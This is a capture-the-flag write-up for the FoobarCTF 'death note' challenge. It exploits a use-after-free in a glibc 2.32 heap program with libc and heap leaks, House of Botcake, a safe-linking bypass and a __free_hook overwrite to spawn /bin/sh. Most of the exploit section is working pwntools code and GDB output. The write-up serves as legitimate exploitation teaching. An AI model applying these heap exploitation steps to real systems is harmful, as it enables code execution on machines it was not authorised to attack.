# FoobarCTF - death note

Origin challenge link: 

You can also download challenge file in my repo: [dist.zip](dist.zip)

There will be several file in zip as below:

```
__MACOSX
__MACOSX/dist
dist
dist/dnote
dist/ld-2.32.so
dist/libc-2.32.so
```

Download and extract, then use `pwninit` to patch file. And now, let's start!

# 1. Find bug

First, we will use `file` to check for basic information:

```
$ file dnote
dnote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8980c2c36d828a8b8434c28e64dd0cf4777fd7cf, for GNU/Linux 3.2.0, not stripped
```

This is a 64-bit file without being stripped. Next, we will use `checksec` to check for all defences of file:

```
$ checksec dnote
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Well, we can see that just `NX enabled`. Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go throught all of them.

First is the main() function. We can see that there are 3 subfunction: `Add Page`, `Show Page` and `Delete Page`. 

With the first option `Add Page`, we can add upto 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with fgets():

![add_page.png](images/add_page.png)

The second option is `Show Page`, which first check if the pointer to chunk is removed or exist in global var `note`. If exist, print data of that chunk out with `puts()` (`puts()` will end at null byte).

![show_page.png](images/show_page.png)

And the last option is `Delete Page` and we don't have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk --> **Use After Free**

![delete_page.png](images/delete_page.png)

And that's all bug we can found. Let's move on the next part: Brainstorming!

# 2. Brainstorming

If you're not familiar with heap, please read [here](https://guyinatuxedo.github.io/25-heap/index.html) to have a general view about all kinds of chunk.

First, we will need to leak the main arena address by freeing a large chunk and make it go to large bin (if goes to unsorted bin, it will have null byte at LSB). When we have the libc address, we will need to do a **Tcache attack**. 

So let's search for available technique to attack lib 2.32 [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.32) and we can see that there is a technique called [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c) will help us double free and overlap chunk. With this, we can overwrite the forward pointer to any address we want.

One thing to notice is that on libc 2.32, the [tcache](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L2928) changed its act with a simple XOR was added to it:

```
1  |/* Caller must ensure that we know tc_idx is valid and there's room
2  |   for more chunks.  */
3  |static __always_inline void
4  |tcache_put (mchunkptr chunk, size_t tc_idx)
5  |{
6  |  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
7  |
8  |  /* Mark this chunk as "in the tcache" so the test in _int_free will
9  |     detect a double free.  */
10 |  e->key = tcache;
11 |
12 |  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
13 |  tcache->entries[tc_idx] = e;
14 |  ++(tcache->counts[tc_idx]);
15 |}
16 |
17 |/* Caller must ensure that we know tc_idx is valid and there's
18 |   available chunks to remove.  */
19 |static __always_inline void *
20 |tcache_get (size_t tc_idx)
21 |{
22 |  tcache_entry *e = tcache->entries[tc_idx];
23 |  if (__glibc_unlikely (!aligned_OK (e)))
24 |    malloc_printerr ("malloc(): unaligned tcache chunk detected");
25 |  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
26 |  --(tcache->counts[tc_idx]);
27 |  e->key = NULL;
28 |  return (void *) e;
29 |}
```

Two new macros are added to protect the chunk when storing and fetching a chunk which is linked to an old chunk in tcache (which means when we free a chunk and it goes to tcache, the forward pointer will be XOR first and then write to that chunk).

At line 12 and 25, there is a function called `PROTECT_PTR` and `REVEAL_PTR` which is new in libc 2.32. These functions are definded in [source](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341) as follows:

```
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

For example with the image below, `P` is previous address of old freed chunk, `L` is current chunk being freed, the protected forward pointer can be calculate as:

![ex_protect_ptr.png](images/ex_protect_ptr.png)

We can also create a script to malloc and then free() to make it go to tcache and we check that. The address for the first chunk is `0x55555555b2a0` (don't include heap metadata):

![prev_chunk_ex.png](images/prev_chunk_ex.png)

So when it's freed, the protected forward pointer for this chunk can be calculate as follows:

```
# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>
  (     0x55555555b2a0     >> 12) ^             0            = 0x55555555b
```

Because this is the first chunk being freed and go to tcache first so `<Previous chunk address>` will equal to 0. And we will have the address for the second chunk is `0x55555555c2e0` (don't include heap metadata):

![current_chunk_ex.png](images/current_chunk_ex.png)

So the protected forward pointer will equal to:

```
# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>
  (     0x55555555c2e0     >> 12) ^      0x55555555b2a0      = 0x55500000e7fc
```

So to overwrite forward pointer, we need the address of previous chunk. That's the point we need to notice here.

Reference soure:

https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4

http://blog.nsfocus.net/glibc-234/

- Summary:
  1. Leak main arena address
  2. Leak heap address
  3. Overwrite forward pointer
  4. Overwrite `__free_hook` with system()

# 3. Exploit

Before we exploit, I wrote these function for a convinient exploitation:

<details>
<summary>Code snippet</summary>
<p>

```
def add(idx, size, data):
    p.sendlineafter('>> ', b'1')
    p.sendlineafter('no : ', str(idx).encode())
    p.sendlineafter('size : ', str(size).encode())
    p.sendlineafter('Name : ', data)

def show(idx):
    p.sendlineafter('>> ', b'2')
    p.sendlineafter('no : ', str(idx).encode())
    return p.recvuntil(b'\n', drop=True)

def free(idx):
    p.sendlineafter('>> ', b'3')
    p.sendlineafter('no : ', str(idx).encode())
```

</p>
</details>

And now let's start!

### Stage 1: Leak main arena address

First, we will create a large chunk and then free it to make it go to unsorted bin:

```
add(0, 0x1000, '{}'.format(0).encode()*8)
add(1, 0x10, '{}'.format(1).encode()*8)
free(0)
```

Check in GDB and we can see that the main arena address contains null byte at LSB:

![unsortedbin_null_byte.png](images/unsortedbin_null_byte.png)

And we know that puts() will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it's different:

```
add(0, 0x1100, '{}'.format(2).encode()*8)
```

And check again, we see that there is no null byte in the address anymore:

![large_bin_not_null_byte.png](images/large_bin_not_null_byte.png)

And below the libc main arena address is the heap forward and backward pointer but we won't use this chunk to leak that heap address. Just libc is enough.

So we just leak the libc address out with the bug **Use After Free**, then calculate the offset and take the leaked address subtract with offset, we will get the libc base address:

```
gef➤  x/10xg 0x1b882a0-0x10
0x1b88290:  0x0000000000000000  0x0000000000001011
0x1b882a0:  0x00007f4a4b3d9220  0x00007f4a4b3d9220
0x1b882b0:  0x0000000001b88290  0x0000000001b88290
0x1b882c0:  0x0000000000000000  0x0000000000000000
0x1b882d0:  0x0000000000000000  0x0000000000000000

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
...
0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched
0x0000000001b88000 0x0000000001ba9000 0x0000000000000000 rw- [heap]
0x00007f4a4b212000 0x00007f4a4b214000 0x0000000000000000 rw- 
0x00007f4a4b214000 0x00007f4a4b23a000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
0x00007f4a4b23a000 0x00007f4a4b388000 0x0000000000026000 r-x /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
...

gef➤  p/x 0x00007f4a4b3d9220 - 0x00007f4a4b214000
$1 = 0x1c5220
```

So offset is `0x1c5220`. The following code will be use to take this leak and calculate libc base address:

```
libc.address = u64(show(7) + b'\x00\x00') - 0x1c5220
log.success("Libc base: " + hex(libc.address))
```

That's great! Let's move on the next stage: Leak heap address!


### Stage 2: Leak heap address

To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just free() 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:

```
fw_pointer = u64(show(0).ljust(8, b'\x00'))
log.success("Leak fw pointer: " + hex(fw_pointer))
```

And we can see that the forward pointer was leaked:

![fw_pointer_leaked.png](images/fw_pointer_leaked.png)

Check with GDB:

![check_fw_pointer.png](images/check_fw_pointer.png)

So as I mentioned above, with the first chunk is freed and goes to tcache, the forward pointer will be like this:

```
# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>
  (       0x1a1c2a0        >> 12) ^             0            = 0x1a1c
```

So to recover the heap base address, we just simply do the reverse order (don't need to XOR) with the following payload:

```
heap = u64(show(0).ljust(8, b'\x00')) << 12
log.success("Heap base: " + hex(heap))
```

And we get the heap base address. Before we move on next stage, just malloc again to reset the state of tcache bin to null:

```
add(0, 0x10, '{}'.format(0).encode()*8)
```

And now, let's move on!

### Stage 3: Overwrite forward pointer

For this stage, we will use the technique called [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c). 

We will first malloc 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:

```
for i in range(7):
    add(i, 0x100, '{}'.format(i).encode()*8)
```

Next, we will create 2 chunks with the same size as 0x100, the first one will be used for controlling (overwrite forward pointer) and the second one for attacking tcache:

```
add(7, 0x100, '{}'.format(7).encode()*8)
add(8, 0x100, '{}'.format(8).encode()*8)
```

And 1 small chunk to avoid consolidation:

```
add(9, 0x10, '{}'.format(9).encode()*8)
```

Next, we will free all 7 chunks at the begining of this stage to fill up the tcache:

```
for i in range(7):
    free(i)
```

And with the next free() the chunk with the same size as 0x100, because tcache is full so it will not be added to tcache but will put it to fastbin (if within size range of fastbin) or unsorted bin (in this case is unsorted bin because 0x100 is larger than fastbin)

![unsorted_bin_after_7_free.png](images/unsorted_bin_after_7_free.png)

So as the technique describe, we still have 2 chunk (index 7 and 8) haven't freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was malloc() later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:

```
free(8)
free(7)
```

After that, we will malloc 1 chunk with the same size of 0x100 to take 1 address out from tcache, and we free that chunk index 8 to put it to tcache and we successfully conducted a double free:

```
add(20, 0x100, b'testtest')
free(8)
```

I malloc with index 20 to not remove the pointer of index 8. After this, let's check GDB. We can see that tcache is full of 7 chunk:

![tcache.png](images/tcache.png)

And unsorted bin contain a freed chunk:

![unsorted_bin.png](images/unsorted_bin.png)

Check the unsorted bin and we can see this:

```
gef➤  x/50xg 0x1604a20
0x1604a20:  0x0000000000000000  0x0000000000000221
0x1604a30:  0x0000000001604c60  0x00007f2a65850c00    <-- Unsorted bin
0x1604a40:  0x0000000000000000  0x0000000000000000
0x1604a50:  0x0000000000000000  0x0000000000000000
0x1604a60:  0x0000000000000000  0x0000000000000000
0x1604a70:  0x0000000000000000  0x0000000000000000
0x1604a80:  0x0000000000000000  0x0000000000000000
0x1604a90:  0x0000000000000000  0x0000000000000000
0x1604aa0:  0x0000000000000000  0x0000000000000000
0x1604ab0:  0x0000000000000000  0x0000000000000000
0x1604ac0:  0x0000000000000000  0x0000000000000000
0x1604ad0:  0x0000000000000000  0x0000000000000000
0x1604ae0:  0x0000000000000000  0x0000000000000000
0x1604af0:  0x0000000000000000  0x0000000000000000
0x1604b00:  0x0000000000000000  0x0000000000000000
0x1604b10:  0x0000000000000000  0x0000000000000000
0x1604b20:  0x0000000000000000  0x0000000000000000
0x1604b30:  0x0000000000000000  0x0000000000000111
0x1604b40:  0x0000000001605e14  0x0000000001604010    <-- Tcache
0x1604b50:  0x0000000000000000  0x0000000000000000
0x1604b60:  0x0000000000000000  0x0000000000000000
0x1604b70:  0x0000000000000000  0x0000000000000000
0x1604b80:  0x0000000000000000  0x0000000000000000
0x1604b90:  0x0000000000000000  0x0000000000000000
0x1604ba0:  0x0000000000000000  0x0000000000000000
```

The unsorted bin size is 0x210 so that we can malloc a chunk larger than 0x100 to change the forward pointer in tcache chunk. But first, we need to take the offset between heap base address and that tcache chunk address `0x1604b40`:

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
...
0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched
0x0000000001604000 0x0000000001625000 0x0000000000000000 rw- [heap]
0x00007f2a6568a000 0x00007f2a6568c000 0x0000000000000000 rw- 
0x00007f2a6568c000 0x00007f2a656b2000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
...

gef➤  p/x  0x1604b40- 0x0000000001604000
$1 = 0xb40
```

So we know the offset. Remember the new mechanism for the forward pointer and we can fake the forward pointer to malloc `__free_hook` with the payload below:

```
# The chunk we overwrite forward pointer has address at "heap + 0xb40"
fake_fw_pointer = ((heap + 0xb40) >> 12) ^ (libc.sym['__free_hook'])
```

So that we fake the previous chunk into `__free_hook` and write it with the chunk from unsorted bin. We will malloc a chunk with size of 0x130 for overwriting:

```
payload = b'\x00'*0x100                 # Padding to tcache
payload += flat(0, 0x111)               # Prev_size and size of tcache
payload += flat(fake_fw_pointer)        # Overwrite forward pointer
add(10, 0x130, payload)
```

And let's check if our forward pointer is correct or not (Address changed):

```
gef➤  x/50xg 0x0000000000caca20
0xcaca20:   0x0000000000000000  0x0000000000000141
0xcaca30:   0x00007f43934d0e10  0x00007f43934d0e10    <-- New chunk from unsorted bin
0xcaca40:   0x0000000000000000  0x0000000000000000
0xcaca50:   0x0000000000000000  0x0000000000000000
0xcaca60:   0x0000000000000000  0x0000000000000000
0xcaca70:   0x0000000000000000  0x0000000000000000
0xcaca80:   0x0000000000000000  0x0000000000000000
0xcaca90:   0x0000000000000000  0x0000000000000000
0xcacaa0:   0x0000000000000000  0x0000000000000000
0xcacab0:   0x0000000000000000  0x0000000000000000
0xcacac0:   0x0000000000000000  0x0000000000000000
0xcacad0:   0x0000000000000000  0x0000000000000000
0xcacae0:   0x0000000000000000  0x0000000000000000
0xcacaf0:   0x0000000000000000  0x0000000000000000
0xcacb00:   0x0000000000000000  0x0000000000000000
0xcacb10:   0x0000000000000000  0x0000000000000000
0xcacb20:   0x0000000000000000  0x0000000000000000
0xcacb30:   0x0000000000000000  0x0000000000000111
0xcacb40:   0x0000000000cac4bc  0x0000000000cac010    <-- Tcache
0xcacb50:   0x0000000000000000  0x0000000000000000
0xcacb60:   0x0000000000000000  0x00000000000000e1
0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    <-- Unsorted bin
0xcacb80:   0x0000000000000000  0x0000000000000000
0xcacb90:   0x0000000000000000  0x0000000000000000
0xcacba0:   0x0000000000000000  0x0000000000000000
```

It malloc successfully, let's check if everything is on the right path or not:

```
gef➤  x/50xg 0x0000000000caca20
0xcaca20:   0x0000000000000000  0x0000000000000141
0xcaca30:   0x0000000000000000  0x0000000000000000    <-- New chunk from unsorted bin
0xcaca40:   0x0000000000000000  0x0000000000000000
0xcaca50:   0x0000000000000000  0x0000000000000000
0xcaca60:   0x0000000000000000  0x0000000000000000
0xcaca70:   0x0000000000000000  0x0000000000000000
0xcaca80:   0x0000000000000000  0x0000000000000000
0xcaca90:   0x0000000000000000  0x0000000000000000
0xcacaa0:   0x0000000000000000  0x0000000000000000
0xcacab0:   0x0000000000000000  0x0000000000000000
0xcacac0:   0x0000000000000000  0x0000000000000000
0xcacad0:   0x0000000000000000  0x0000000000000000
0xcacae0:   0x0000000000000000  0x0000000000000000
0xcacaf0:   0x0000000000000000  0x0000000000000000
0xcacb00:   0x0000000000000000  0x0000000000000000
0xcacb10:   0x0000000000000000  0x0000000000000000
0xcacb20:   0x0000000000000000  0x0000000000000000
0xcacb30:   0x0000000000000000  0x0000000000000111
0xcacb40:   0x00007f43934d37cc  0x0000000000ca000a    <-- Forward pointer changed
0xcacb50:   0x0000000000000000  0x0000000000000000
0xcacb60:   0x0000000000000000  0x00000000000000e1
0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    <-- Unsorted bin
0xcacb80:   0x0000000000000000  0x0000000000000000
0xcacb90:   0x0000000000000000  0x0000000000000000
0xcacba0:   0x0000000000000000  0x0000000000000000
```

We can see that it's the correct position for our fake forward pointer. Let's see if it's the address of `__free_hook` or not:

![check_free_hook_address.png](images/check_free_hook_address.png)

![free_hook_address.png](images/free_hook_address.png)

That's correct. Let's move on the final stage to get shell!

### Stage 4: Overwrite `__free_hook` with system()

Now, we just need to malloc 2 chunk with the same size as 0x100 to get the address from tcache and with second malloc, we will overwrite the address of system to that. With the first chunk, we will put the string `/bin/sh` into it so we just reuse this chunk to execute system("/bin/sh"):

```
add(11, 0x100, b'/bin/sh')
add(12, 0x100, p64(libc.sym['system']))
```

And finally, we free() chunk index 11 and get shell:

```
free(11)
```

Full code: [solve.py](solve.py)

# 4. Get flag

Poorly, the time passed and the server closed so I cannot connect to it to get the flag but I will run in local:

![get_flag.png](images/get_flag.png)